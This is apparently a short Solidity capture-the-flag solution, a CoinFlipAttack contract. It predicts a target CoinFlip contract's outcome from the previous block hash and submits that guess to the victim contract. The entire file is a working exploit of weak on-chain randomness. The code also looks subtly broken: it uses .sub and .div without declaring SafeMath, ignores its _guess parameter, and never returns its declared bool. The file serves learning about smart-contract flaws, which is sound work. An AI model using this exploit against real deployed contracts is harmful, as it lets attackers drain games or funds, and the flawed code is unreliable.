pragma solidity ^0.6.0;

import "./CoinFlip.sol";
contract CoinFlipAttack {
    // Crate state variable to represent Coinflip contract + Factop
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // init the target coinFlip address
    //we are not using "new" before CoinFlip beacause
    //We want to interact with the existing contract,
    //no a new instance of it 
    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
  }
    // flip functionality to memic the target contracts answere
    function flip(bool _guess) public returns (bool) {
        // Get blockhash of previous block, then convert to interger uinit256
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        // Take blockvalue and divide bye randome seed factor to increase "randomness"
        uint256 coinFlip = blockValue.div(FACTOR);
        // return true if the Coin value == 1 otherwise return false
        bool side = coinFlip == 1 ? true : false;

        //call flip on the victm contract and pass our guess
        victimContract.flip(side);
    }
}